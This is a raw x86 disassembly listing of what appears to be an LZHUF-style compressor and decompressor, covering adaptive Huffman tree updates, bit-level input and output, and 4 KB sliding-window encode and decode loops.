mov eax [ ebp - 0x4 ]
and eax 0xffff
and eax 0xff00
sar eax 0x8
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x8 ]
call sub_404464
mov [ ebp - 0x4 ] ax
mov edx [ ebp - 0x4 ]
and edx 0xffff
cmp edx 0xffff
jne r-xdata
mov eax [ ebp - 0x4 ]
and eax 0xffff
mov ecx [ ebp - 0x8 ]
xor edx edx
mov dl [ ecx + 0x8378 ]
mov ecx 0x8
sub ecx edx
shl eax cl
mov ecx [ ebp - 0x8 ]
mov dx [ ecx + 0x8376 ]
or dx ax
mov eax [ ebp - 0x8 ]
mov [ eax + 0x8376 ] dx
mov ecx [ ebp - 0x8 ]
mov dl [ ecx + 0x8378 ]
add dl 0x8
mov eax [ ebp - 0x8 ]
mov [ eax + 0x8378 ] dl
jmp r-xdata
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp - 0x8 ]
xor ecx ecx
mov cl [ eax + 0x8378 ]
cmp ecx 0x8
jg r-xdata
sub_403408
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0xc ]
and eax 0xffff
mov ecx [ ebp - 0x4 ]
xor edx edx
mov dl [ ecx + 0x837c ]
mov ecx edx
sar eax cl
mov ecx [ ebp - 0x4 ]
mov dx [ ecx + 0x837a ]
or dx ax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x837a ] dx
mov ecx [ ebp - 0x4 ]
mov dl [ ecx + 0x837c ]
add dl [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x837c ] dl
mov ecx [ ebp - 0x4 ]
xor edx edx
mov dl [ ecx + 0x837c ]
cmp edx 0x8
jl r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
xor ecx ecx
mov cx [ eax + 0x837a ]
sar ecx 0x8
push ecx
mov ecx [ ebp - 0x4 ]
call sub_404493
cmp eax 0xffffffff
jne r-xdata
mov edx [ ebp - 0x4 ]
mov al [ edx + 0x837c ]
sub al 0x8
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x837c ] al
mov edx [ ebp - 0x4 ]
xor eax eax
mov al [ edx + 0x837c ]
cmp eax 0x8
jl r-xdata
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov ax [ edx + 0x837a ]
shl ax 0x8
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x837a ] ax
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x4 ]
add eax 0x1
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x4 ] eax
mov ecx [ ebp - 0x4 ]
xor edx edx
mov dx [ ecx + 0x837a ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_404493
cmp eax 0xffffffff
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x4 ]
add ecx 0x2
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov cl [ eax + 0x837c ]
sub cl 0x8
mov edx [ ebp - 0x4 ]
mov [ edx + 0x837c ] cl
mov eax [ ebp + 0xc ]
and eax 0xffff
movsx ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
xor ebx ebx
mov bl [ edx + 0x837c ]
sub ecx ebx
shl eax cl
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x837a ] ax
jmp r-xdata
jmp r-xdata
sub_403542
push ebp
mov ebp esp
sub esp 0xc
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
movsx ecx [ ebp - 0x4 ]
cmp ecx 0x13a
jge r-xdata
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x8 ] 0x13a
movsx edx [ ebp - 0x4 ]
mov eax [ ebp - 0xc ]
mov [ eax + edx * 2 + 0x724e ] 0x1
movsx ecx [ ebp - 0x4 ]
add ecx 0x273
movsx edx [ ebp - 0x4 ]
mov eax [ ebp - 0xc ]
mov [ eax + edx * 2 + 0x7e90 ] cx
movsx ecx [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov ax [ ebp - 0x4 ]
mov [ edx + ecx * 2 + 0x7c1c ] ax
jmp r-xdata
mov eax [ ebp - 0xc ]
mov [ eax + 0x7734 ] 0xffff
mov ecx [ ebp - 0xc ]
mov [ ecx + 0x7c1a ] 0x0
pop esi
mov esp ebp
pop ebp
retn
movsx edx [ ebp - 0x4 ]
mov eax [ ebp - 0xc ]
xor ecx ecx
mov cx [ eax + edx * 2 + 0x724e ]
movsx edx [ ebp - 0x4 ]
mov eax [ ebp - 0xc ]
xor esi esi
mov si [ eax + edx * 2 + 0x7250 ]
add ecx esi
movsx edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
mov [ eax + edx * 2 + 0x724e ] cx
movsx ecx [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
mov ax [ ebp - 0x4 ]
mov [ edx + ecx * 2 + 0x7e90 ] ax
movsx ecx [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov ax [ ebp - 0x8 ]
mov [ edx + ecx * 2 + 0x7738 ] ax
movsx ecx [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov ax [ ebp - 0x8 ]
mov [ edx + ecx * 2 + 0x7736 ] ax
mov cx [ ebp - 0x4 ]
add cx 0x2
mov [ ebp - 0x4 ] cx
mov dx [ ebp - 0x8 ]
add dx 0x1
mov [ ebp - 0x8 ] dx
jmp r-xdata
mov ax [ ebp - 0x4 ]
add ax 0x1
mov [ ebp - 0x4 ] ax
movsx ecx [ ebp - 0x8 ]
cmp ecx 0x272
jg r-xdata
sub_40366d
push ebp
mov ebp esp
sub esp 0x18
push esi
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0xc ] 0x0
mov [ ebp - 0x8 ] 0x0
jmp r-xdata
movsx ecx [ ebp - 0x8 ]
cmp ecx 0x273
jge r-xdata
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0xc ] 0x13a
jmp r-xdata
movsx edx [ ebp - 0x8 ]
mov eax [ ebp - 0x18 ]
movsx ecx [ eax + edx * 2 + 0x7e90 ]
cmp ecx 0x273
jl r-xdata
movsx eax [ ebp - 0xc ]
cmp eax 0x273
jge r-xdata
jmp r-xdata
movsx edx [ ebp - 0x8 ]
mov eax [ ebp - 0x18 ]
xor ecx ecx
mov cx [ eax + edx * 2 + 0x724e ]
mov eax ecx
add eax 0x1
cdq
sub eax edx
sar eax 0x1
movsx edx [ ebp - 0xc ]
mov ecx [ ebp - 0x18 ]
mov [ ecx + edx * 2 + 0x724e ] ax
movsx edx [ ebp - 0x8 ]
movsx eax [ ebp - 0xc ]
mov ecx [ ebp - 0x18 ]
mov esi [ ebp - 0x18 ]
mov dx [ esi + edx * 2 + 0x7e90 ]
mov [ ecx + eax * 2 + 0x7e90 ] dx
mov ax [ ebp - 0xc ]
add ax 0x1
mov [ ebp - 0xc ] ax
mov [ ebp - 0x8 ] 0x0
jmp r-xdata
movsx ecx [ ebp - 0x8 ]
add ecx 0x1
mov [ ebp - 0x10 ] cx
movsx edx [ ebp - 0x8 ]
mov eax [ ebp - 0x18 ]
xor ecx ecx
mov cx [ eax + edx * 2 + 0x724e ]
movsx edx [ ebp - 0x10 ]
mov eax [ ebp - 0x18 ]
xor esi esi
mov si [ eax + edx * 2 + 0x724e ]
add ecx esi
movsx edx [ ebp - 0xc ]
mov eax [ ebp - 0x18 ]
mov [ eax + edx * 2 + 0x724e ] cx
movsx ecx [ ebp - 0xc ]
mov edx [ ebp - 0x18 ]
mov ax [ edx + ecx * 2 + 0x724e ]
mov [ ebp - 0x4 ] ax
movsx ecx [ ebp - 0xc ]
sub ecx 0x1
mov [ ebp - 0x10 ] cx
jmp r-xdata
mov ax [ ebp - 0x8 ]
add ax 0x1
mov [ ebp - 0x8 ] ax
movsx eax [ ebp - 0x8 ]
cmp eax 0x273
jge r-xdata
mov eax [ ebp - 0x4 ]
and eax 0xffff
movsx ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x18 ]
xor esi esi
mov si [ edx + ecx * 2 + 0x724e ]
cmp eax esi
jge r-xdata
pop esi
mov esp ebp
pop ebp
retn
movsx ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x18 ]
mov ax [ edx + ecx * 2 + 0x7e90 ]
mov [ ebp - 0x10 ] ax
movsx ecx [ ebp - 0x10 ]
cmp ecx 0x273
jl r-xdata
mov ax [ ebp - 0x10 ]
add ax 0x1
mov [ ebp - 0x10 ] ax
movsx ecx [ ebp - 0xc ]
movsx edx [ ebp - 0x10 ]
sub ecx edx
shl ecx 0x1
mov [ ebp - 0x14 ] cx
mov eax [ ebp - 0x14 ]
and eax 0xffff
push eax
movsx ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x18 ]
lea eax [ edx + ecx * 2 + 0x724e ]
push eax
movsx ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x18 ]
lea eax [ edx + ecx * 2 + 0x7250 ]
push eax
call [ memmove@IAT ]
add esp 0xc
movsx ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x18 ]
mov ax [ ebp - 0x4 ]
mov [ edx + ecx * 2 + 0x724e ] ax
mov ecx [ ebp - 0x14 ]
and ecx 0xffff
push ecx
movsx edx [ ebp - 0x10 ]
mov eax [ ebp - 0x18 ]
lea ecx [ eax + edx * 2 + 0x7e90 ]
push ecx
movsx edx [ ebp - 0x10 ]
mov eax [ ebp - 0x18 ]
lea ecx [ eax + edx * 2 + 0x7e92 ]
push ecx
call [ memmove@IAT ]
add esp 0xc
movsx edx [ ebp - 0x10 ]
mov eax [ ebp - 0x18 ]
mov cx [ ebp - 0x8 ]
mov [ eax + edx * 2 + 0x7e90 ] cx
jmp r-xdata
jmp r-xdata
movsx edx [ ebp - 0x10 ]
mov eax [ ebp - 0x18 ]
mov cx [ ebp - 0x8 ]
mov [ eax + edx * 2 + 0x7738 ] cx
movsx edx [ ebp - 0x10 ]
mov eax [ ebp - 0x18 ]
mov cx [ ebp - 0x8 ]
mov [ eax + edx * 2 + 0x7736 ] cx
movsx edx [ ebp - 0x10 ]
mov eax [ ebp - 0x18 ]
mov cx [ ebp - 0x8 ]
mov [ eax + edx * 2 + 0x7736 ] cx
jmp r-xdata
mov cx [ ebp - 0x8 ]
add cx 0x2
mov [ ebp - 0x8 ] cx
mov dx [ ebp - 0xc ]
add dx 0x1
mov [ ebp - 0xc ] dx
mov dx [ ebp - 0x10 ]
sub dx 0x1
mov [ ebp - 0x10 ] dx
mov dx [ ebp - 0x8 ]
add dx 0x1
mov [ ebp - 0x8 ] dx
jmp r-xdata
sub_4038f3
push ebp
mov ebp esp
sub esp 0x14
push esi
mov [ ebp - 0x14 ] ecx
mov eax [ ebp - 0x14 ]
xor ecx ecx
mov cx [ eax + 0x7732 ]
cmp ecx 0x8000
jne r-xdata
movsx edx [ ebp + 0x8 ]
mov eax [ ebp - 0x14 ]
mov cx [ eax + edx * 2 + 0x7c1c ]
mov [ ebp + 0x8 ] cx
mov ecx [ ebp - 0x14 ]
call sub_40366d
movsx ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x14 ]
mov ax [ edx + ecx * 2 + 0x7736 ]
mov [ ebp + 0x8 ] ax
movsx ecx [ ebp + 0x8 ]
test ecx ecx
jne r-xdata
mov eax [ ebp - 0xc ]
and eax 0xffff
mov cx [ ebp - 0x10 ]
add cx 0x1
mov [ ebp - 0x10 ] cx
movsx edx [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
xor esi esi
mov si [ ecx + edx * 2 + 0x724e ]
cmp eax esi
jle r-xdata
movsx edx [ ebp + 0x8 ]
mov eax [ ebp - 0x14 ]
mov cx [ eax + edx * 2 + 0x724e ]
add cx 0x1
movsx edx [ ebp + 0x8 ]
mov eax [ ebp - 0x14 ]
mov [ eax + edx * 2 + 0x724e ] cx
movsx ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x14 ]
mov ax [ edx + ecx * 2 + 0x724e ]
mov [ ebp - 0xc ] ax
mov ecx [ ebp - 0xc ]
and ecx 0xffff
movsx edx [ ebp + 0x8 ]
add edx 0x1
mov [ ebp - 0x10 ] dx
movsx eax [ ebp - 0x10 ]
mov edx [ ebp - 0x14 ]
xor esi esi
mov si [ edx + eax * 2 + 0x724e ]
cmp ecx esi
jle r-xdata
pop esi
mov esp ebp
pop ebp
retn 0x4
mov dx [ ebp - 0x10 ]
sub dx 0x1
mov [ ebp - 0x10 ] dx
movsx eax [ ebp - 0x10 ]
movsx ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x14 ]
mov esi [ ebp - 0x14 ]
mov ax [ esi + eax * 2 + 0x724e ]
mov [ edx + ecx * 2 + 0x724e ] ax
movsx ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x14 ]
mov ax [ ebp - 0xc ]
mov [ edx + ecx * 2 + 0x724e ] ax
movsx ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x14 ]
mov ax [ edx + ecx * 2 + 0x7e90 ]
mov [ ebp - 0x4 ] ax
movsx ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x14 ]
mov ax [ ebp - 0x10 ]
mov [ edx + ecx * 2 + 0x7736 ] ax
movsx ecx [ ebp - 0x4 ]
cmp ecx 0x273
jge r-xdata
jmp r-xdata
movsx edx [ ebp - 0x10 ]
mov eax [ ebp - 0x14 ]
mov cx [ eax + edx * 2 + 0x7e90 ]
mov [ ebp - 0x8 ] cx
movsx edx [ ebp - 0x10 ]
mov eax [ ebp - 0x14 ]
mov cx [ ebp - 0x4 ]
mov [ eax + edx * 2 + 0x7e90 ] cx
movsx edx [ ebp - 0x8 ]
mov eax [ ebp - 0x14 ]
mov cx [ ebp + 0x8 ]
mov [ eax + edx * 2 + 0x7736 ] cx
movsx edx [ ebp - 0x8 ]
cmp edx 0x273
jge r-xdata
movsx edx [ ebp - 0x4 ]
mov eax [ ebp - 0x14 ]
mov cx [ ebp - 0x10 ]
mov [ eax + edx * 2 + 0x7738 ] cx
movsx eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x14 ]
mov dx [ ebp - 0x8 ]
mov [ ecx + eax * 2 + 0x7e90 ] dx
mov ax [ ebp - 0x10 ]
mov [ ebp + 0x8 ] ax
movsx eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x14 ]
mov dx [ ebp + 0x8 ]
mov [ ecx + eax * 2 + 0x7738 ] dx
sub_403ad4
push ebp
mov ebp esp
sub esp 0x10
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp + 0x8 ]
and eax 0xffff
mov ecx [ ebp - 0x10 ]
mov dx [ ecx + eax * 2 + 0x7c1c ]
mov [ ebp - 0xc ] dx
mov ax [ ebp - 0x8 ]
add ax 0x1
mov [ ebp - 0x8 ] ax
movsx ecx [ ebp - 0xc ]
mov edx [ ebp - 0x10 ]
mov ax [ edx + ecx * 2 + 0x7736 ]
mov [ ebp - 0xc ] ax
movsx ecx [ ebp - 0xc ]
cmp ecx 0x272
jne r-xdata
mov dx [ ebp - 0x4 ]
add dx 0x8000
mov [ ebp - 0x4 ] dx
mov ax [ ebp - 0x4 ]
shr ax 0x1
mov [ ebp - 0x4 ] ax
movsx ecx [ ebp - 0xc ]
and ecx 0x1
test ecx ecx
je r-xdata
mov dx [ ebp - 0x4 ]
push edx
mov ax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x10 ]
call sub_403408
mov ecx [ ebp - 0x10 ]
mov dx [ ebp - 0x4 ]
mov [ ecx + 0x837e ] dx
mov eax [ ebp - 0x10 ]
mov cx [ ebp - 0x8 ]
mov [ eax + 0x8380 ] cx
mov dx [ ebp + 0x8 ]
push edx
mov ecx [ ebp - 0x10 ]
call sub_4038f3
mov esp ebp
pop ebp
retn 0x4
sub_403b8f
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x8 ] ecx
mov eax [ ebp + 0x8 ]
and eax 0xffff
sar eax 0x6
mov [ ebp - 0x4 ] ax
mov ecx [ ebp - 0x4 ]
and ecx 0xffff
xor edx edx
mov dl [ ecx + rw-data ]
shl edx 0x8
push edx
mov eax [ ebp - 0x4 ]
and eax 0xffff
movzx cx [ eax + rw-data ]
push ecx
mov ecx [ ebp - 0x8 ]
call sub_403408
mov edx [ ebp + 0x8 ]
and edx 0xffff
and edx 0x3f
shl edx 0xa
push edx
push 0x6
mov ecx [ ebp - 0x8 ]
call sub_403408
mov esp ebp
pop ebp
retn 0x4
sub_403bf5
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
xor ecx ecx
mov cl [ eax + 0x837c ]
test ecx ecx
je r-xdata
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x4 ]
xor eax eax
mov ax [ edx + 0x837a ]
sar eax 0x8
push eax
mov ecx [ ebp - 0x4 ]
call sub_404493
cmp eax 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x4 ]
add edx 0x1
mov eax [ ebp - 0x4 ]
mov [ eax + 0x4 ] edx
jmp r-xdata
sub_403c3d
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x8 ] ecx
mov eax [ ebp - 0x8 ]
mov cx [ eax + 0x8374 ]
mov [ ebp - 0x4 ] cx
mov dx [ ebp - 0x4 ]
sub dx 0x273
mov [ ebp - 0x4 ] dx
mov ax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x8 ]
call sub_4038f3
mov ax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x8 ]
call sub_40325f
mov cx [ ebp - 0x4 ]
add cx ax
mov [ ebp - 0x4 ] cx
mov edx [ ebp - 0x4 ]
and edx 0xffff
mov eax [ ebp - 0x8 ]
mov cx [ eax + edx * 2 + 0x7e90 ]
mov [ ebp - 0x4 ] cx
jmp r-xdata
mov edx [ ebp - 0x4 ]
and edx 0xffff
cmp edx 0x273
jge r-xdata
sub_403cb4
push ebp
mov ebp esp
sub esp 0x10
push esi
mov [ ebp - 0x10 ] ecx
mov ecx [ ebp - 0x10 ]
call sub_403333
mov [ ebp - 0x8 ] ax
mov eax [ ebp - 0x8 ]
and eax 0xffff
xor ecx ecx
mov cl [ eax + rw-data ]
shl ecx 0x6
mov [ ebp - 0x4 ] cx
mov edx [ ebp - 0x8 ]
and edx 0xffff
movzx ax [ edx + rw-data ]
mov [ ebp - 0xc ] ax
mov cx [ ebp - 0xc ]
sub cx 0x2
mov [ ebp - 0xc ] cx
mov eax [ ebp - 0x4 ]
and eax 0xffff
mov edx [ ebp - 0x8 ]
and edx 0xffff
and edx 0x3f
or eax edx
pop esi
mov esp ebp
pop ebp
retn
mov esi [ ebp - 0x8 ]
and esi 0xffff
mov ecx [ ebp - 0x10 ]
call sub_40325f
and eax 0xffff
lea ecx [ eax + esi * 2 ]
mov [ ebp - 0x8 ] cx
jmp r-xdata
mov edx [ ebp - 0xc ]
and edx 0xffff
mov ax [ ebp - 0xc ]
sub ax 0x1
mov [ ebp - 0xc ] ax
test edx edx
je r-xdata
sub_403d55
push ebp
mov ebp esp
sub esp 0x1c
mov [ ebp - 0x1c ] ecx
mov eax [ ebp - 0x1c ]
mov [ eax + 0x4 ] 0x0
mov ecx [ ebp - 0x1c ]
mov edx [ ecx ]
and edx 0xff
and edx 0xff
push edx
mov ecx [ ebp - 0x1c ]
call sub_404493
mov eax [ ebp - 0x1c ]
mov ecx [ eax ]
and ecx 0xff00
shr ecx 0x8
and ecx 0xff
push ecx
mov ecx [ ebp - 0x1c ]
call sub_404493
mov edx [ ebp - 0x1c ]
mov eax [ edx ]
and eax 0xff0000
shr eax 0x10
and eax 0xff
push eax
mov ecx [ ebp - 0x1c ]
call sub_404493
mov ecx [ ebp - 0x1c ]
mov edx [ ecx ]
and edx 0xff000000
shr edx 0x18
and edx 0xff
push edx
mov ecx [ ebp - 0x1c ]
call sub_404493
mov eax [ ebp - 0x1c ]
cmp [ eax ] 0x0
jne r-xdata
mov ecx [ ebp - 0x1c ]
mov [ ecx ] 0x0
mov ecx [ ebp - 0x1c ]
call sub_403542
mov ecx [ ebp - 0x1c ]
call sub_402c9e
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0x4 ] 0xfc4
mov dx [ ebp - 0x8 ]
mov [ ebp - 0x10 ] dx
jmp r-xdata
jmp r-xdata
movsx ecx [ ebp - 0x10 ]
movsx edx [ ebp - 0x4 ]
cmp ecx edx
jge r-xdata
mov esp ebp
pop ebp
retn
mov [ ebp - 0x18 ] 0x0
jmp r-xdata
movsx eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x1c ]
mov [ ecx + eax + 0x8 ] 0x20
jmp r-xdata
movsx eax [ ebp - 0x18 ]
cmp eax 0x3c
jge r-xdata
mov ax [ ebp - 0x10 ]
add ax 0x1
mov [ ebp - 0x10 ] ax
movsx edx [ ebp - 0x18 ]
mov eax [ ebp - 0x1c ]
mov [ eax ] edx
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
mov ecx [ ebp - 0x1c ]
call sub_404464
mov [ ebp - 0xc ] ax
movsx ecx [ ebp - 0xc ]
cmp ecx 0xffffffff
je r-xdata
movsx edx [ ebp - 0x10 ]
cmp edx 0x3c
jg r-xdata
movsx edx [ ebp - 0x4 ]
movsx eax [ ebp - 0x18 ]
add eax [ ebp - 0x1c ]
mov cl [ ebp - 0xc ]
mov [ eax + edx + 0x8 ] cl
jmp r-xdata
mov dx [ ebp - 0x4 ]
push edx
mov ecx [ ebp - 0x1c ]
call sub_402d11
movsx eax [ ebp - 0x4 ]
movsx ecx [ ebp - 0x10 ]
sub eax ecx
push eax
mov ecx [ ebp - 0x1c ]
call sub_402d11
jmp r-xdata
mov dx [ ebp - 0x18 ]
add dx 0x1
mov [ ebp - 0x18 ] dx
mov edx [ ebp - 0x1c ]
movsx eax [ edx + 0x1046 ]
cmp eax 0x2
jg r-xdata
mov eax [ ebp - 0x1c ]
mov cx [ ebp - 0x18 ]
mov [ eax + 0x1046 ] cx
mov cx [ ebp - 0x10 ]
add cx 0x1
mov [ ebp - 0x10 ] cx
mov edx [ ebp - 0x1c ]
movsx eax [ edx + 0x1046 ]
add eax 0xfd
push eax
mov ecx [ ebp - 0x1c ]
call sub_403ad4
mov ecx [ ebp - 0x1c ]
mov dx [ ecx + 0x1044 ]
push edx
mov ecx [ ebp - 0x1c ]
call sub_403b8f
mov ecx [ ebp - 0x1c ]
mov [ ecx + 0x1046 ] 0x1
movsx edx [ ebp - 0x4 ]
mov eax [ ebp - 0x1c ]
movzx cx [ eax + edx + 0x8 ]
push ecx
mov ecx [ ebp - 0x1c ]
call sub_403ad4
jmp r-xdata
movsx eax [ ebp - 0x10 ]
movsx ecx [ ebp - 0x14 ]
cmp eax ecx
jge r-xdata
mov eax [ ebp - 0x1c ]
mov cx [ eax + 0x1046 ]
mov [ ebp - 0x14 ] cx
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
movsx edx [ ebp - 0x10 ]
movsx eax [ ebp - 0x14 ]
mov cx [ ebp - 0x10 ]
add cx 0x1
mov [ ebp - 0x10 ] cx
cmp edx eax
jge r-xdata
mov ecx [ ebp - 0x1c ]
call sub_404464
mov [ ebp - 0xc ] ax
movsx edx [ ebp - 0xc ]
cmp edx 0xffffffff
je r-xdata
movsx edx [ ebp - 0x18 ]
test edx edx
jg r-xdata
mov dx [ ebp - 0x8 ]
push edx
mov ecx [ ebp - 0x1c ]
call sub_403023
movsx eax [ ebp - 0x8 ]
add eax 0x1
and eax 0xfff
mov [ ebp - 0x8 ] ax
movsx ecx [ ebp - 0x4 ]
add ecx 0x1
and ecx 0xfff
mov [ ebp - 0x4 ] cx
mov dx [ ebp - 0x18 ]
sub dx 0x1
mov [ ebp - 0x18 ] dx
movsx eax [ ebp - 0x18 ]
test eax eax
je r-xdata
mov ax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x1c ]
call sub_403023
movsx ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x1c ]
mov al [ ebp - 0xc ]
mov [ edx + ecx + 0x8 ] al
movsx ecx [ ebp - 0x8 ]
cmp ecx 0x3b
jge r-xdata
mov eax [ ebp - 0x1c ]
movsx ecx [ eax + 0x1046 ]
movsx edx [ ebp - 0x18 ]
cmp ecx edx
jle r-xdata
mov ecx [ ebp - 0x1c ]
call sub_403bf5
jmp r-xdata
mov cx [ ebp - 0x4 ]
push ecx
mov ecx [ ebp - 0x1c ]
call sub_402d11
movsx edx [ ebp - 0x8 ]
add edx 0x1
and edx 0xfff
mov [ ebp - 0x8 ] dx
movsx eax [ ebp - 0x4 ]
add eax 0x1
and eax 0xfff
mov [ ebp - 0x4 ] ax
mov cx [ ebp - 0x4 ]
push ecx
mov ecx [ ebp - 0x1c ]
call sub_402d11
jmp r-xdata
movsx edx [ ebp - 0x8 ]
mov eax [ ebp - 0x1c ]
mov cl [ ebp - 0xc ]
mov [ eax + edx + 0x1008 ] cl
mov dx [ ebp - 0x10 ]
add dx 0x1
mov [ ebp - 0x10 ] dx
sub_404071
push ebp
mov ebp esp
sub esp 0x1c
push esi
mov [ ebp - 0x1c ] ecx
mov eax [ ebp - 0x1c ]
mov [ eax + 0x4 ] 0x0
mov ecx [ ebp - 0x1c ]
call sub_404464
mov ecx [ ebp - 0x1c ]
mov [ ecx ] eax
mov ecx [ ebp - 0x1c ]
call sub_404464
shl eax 0x8
mov edx [ ebp - 0x1c ]
mov ecx [ edx ]
or ecx eax
mov edx [ ebp - 0x1c ]
mov [ edx ] ecx
mov ecx [ ebp - 0x1c ]
call sub_404464
shl eax 0x10
mov ecx [ ebp - 0x1c ]
mov edx [ ecx ]
or edx eax
mov eax [ ebp - 0x1c ]
mov [ eax ] edx
mov ecx [ ebp - 0x1c ]
call sub_404464
shl eax 0x18
mov ecx [ ebp - 0x1c ]
mov edx [ ecx ]
or edx eax
mov eax [ ebp - 0x1c ]
mov [ eax ] edx
mov ecx [ ebp - 0x1c ]
cmp [ ecx ] 0x0
jne r-xdata
mov ecx [ ebp - 0x1c ]
call sub_403542
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
jmp r-xdata
movsx eax [ ebp - 0x10 ]
cmp eax 0xfc4
jge r-xdata
pop esi
mov esp ebp
pop ebp
retn
mov [ ebp - 0x4 ] 0xfc4
mov [ ebp - 0xc ] 0x0
movsx ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x1c ]
mov [ edx + ecx + 0x8 ] 0x20
jmp r-xdata
mov ecx [ ebp - 0x1c ]
call sub_403c3d
mov [ ebp - 0x8 ] ax
movsx edx [ ebp - 0x8 ]
cmp edx 0x100
jge r-xdata
mov dx [ ebp - 0x10 ]
add dx 0x1
mov [ ebp - 0x10 ] dx
movsx esi [ ebp - 0x4 ]
mov ecx [ ebp - 0x1c ]
call sub_403cb4
movsx ecx ax
sub esi ecx
sub esi 0x1
and esi 0xfff
mov [ ebp - 0x10 ] si
movsx edx [ ebp - 0x8 ]
sub edx 0xfd
mov [ ebp - 0x14 ] dx
mov [ ebp - 0x18 ] 0x0
jmp r-xdata
movsx eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x1c ]
call sub_404493
cmp eax 0xffffffff
jne r-xdata
movsx ecx [ ebp - 0x18 ]
movsx edx [ ebp - 0x14 ]
cmp ecx edx
jge r-xdata
movsx ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x1c ]
mov al [ ebp - 0x8 ]
mov [ edx + ecx + 0x8 ] al
mov cx [ ebp - 0x4 ]
add cx 0x1
mov [ ebp - 0x4 ] cx
mov dx [ ebp - 0x4 ]
and dx 0xfff
mov [ ebp - 0x4 ] dx
mov eax [ ebp - 0xc ]
add eax 0x1
mov [ ebp - 0xc ] eax
jmp r-xdata
jmp r-xdata
jmp r-xdata
movsx eax [ ebp - 0x10 ]
movsx ecx [ ebp - 0x18 ]
add eax ecx
and eax 0xfff
mov edx [ ebp - 0x1c ]
movzx ax [ edx + eax + 0x8 ]
mov [ ebp - 0x8 ] ax
movsx ecx [ ebp - 0x8 ]
push ecx
mov ecx [ ebp - 0x1c ]
call sub_404493
cmp eax 0xffffffff
jne r-xdata
mov eax [ ebp - 0x1c ]
mov ecx [ ebp - 0xc ]
cmp ecx [ eax ]
jae r-xdata
movsx edx [ ebp - 0x4 ]
mov eax [ ebp - 0x1c ]
mov cl [ ebp - 0x8 ]
mov [ eax + edx + 0x8 ] cl
mov dx [ ebp - 0x4 ]
add dx 0x1
mov [ ebp - 0x4 ] dx
mov ax [ ebp - 0x4 ]
and ax 0xfff
mov [ ebp - 0x4 ] ax
mov ecx [ ebp - 0xc ]
add ecx 0x1
mov [ ebp - 0xc ] ecx
jmp r-xdata
jmp r-xdata
mov ax [ ebp - 0x18 ]
add ax 0x1
mov [ ebp - 0x18 ] ax
sub_40424f
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x8 ] ecx
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
add edx [ ecx + 0x8398 ]
mov eax [ ebp - 0x8 ]
cmp edx [ eax + 0x838c ]
jle r-xdata
mov ecx [ ebp - 0x4 ]
push ecx
mov edx [ ebp - 0x8 ]
mov eax [ edx + 0x8384 ]
mov ecx [ ebp - 0x8 ]
add eax [ ecx + 0x8398 ]
push eax
mov edx [ ebp + 0x8 ]
push edx
call memcpy
add esp 0xc
mov eax [ ebp - 0x8 ]
mov ecx [ eax + 0x8398 ]
add ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
